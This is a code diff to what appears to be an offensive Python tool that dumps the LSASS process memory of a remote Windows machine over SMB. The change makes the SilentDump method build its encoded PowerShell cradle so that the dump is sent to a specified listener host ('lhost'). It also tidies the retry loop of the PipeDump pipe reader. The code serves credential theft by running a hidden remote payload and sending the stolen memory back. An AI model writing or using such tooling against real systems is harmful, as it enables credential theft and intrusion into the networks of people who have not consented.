@@ -123,6 +123,10 @@ class SilentDump(DumpMethod):
 
     name = "silent"
 
+    def __init__(self, session: SmbSession, lhost: str):
+        super().__init__(session)
+        self.lhost = lhost
+
     def execute(self, lsass_pid: int | None = None, listen_port: int = 0) -> bytes:
         from .receiver import DumpReceiver
 
@@ -134,8 +138,7 @@ class SilentDump(DumpMethod):
         receiver = DumpReceiver(port=listen_port)
         listen_port = receiver.start()
 
-        local_ip = self.session._conn.server_name
-        ps_script = self._build_ps_cradle(lsass_pid, local_ip, listen_port)
+        ps_script = self._build_ps_cradle(lsass_pid, self.lhost, listen_port)
 
         import base64
         encoded = base64.b64encode(ps_script.encode("utf-16-le")).decode()
@@ -285,10 +288,8 @@ class PipeDump(DumpMethod):
 
     def _read_pipe_with_retry(self, pipe_name: str, timeout: int = 30) -> bytes:
         """Connect to the agent's pipe with retries, then read all dump data."""
-        import time as _time
-
-        deadline = _time.monotonic() + timeout
-        while _time.monotonic() < deadline:
+        deadline = time.monotonic() + timeout
+        while time.monotonic() < deadline:
             try:
                 with self.session.open_pipe(pipe_name) as pipe:
                     chunks = []
@@ -302,6 +303,6 @@ class PipeDump(DumpMethod):
                             break
                     return b"".join(chunks)
             except Exception:
-                _time.sleep(1)
+                time.sleep(1)
 
         raise RuntimeError(f"Timeout connecting to agent pipe '{pipe_name}'")
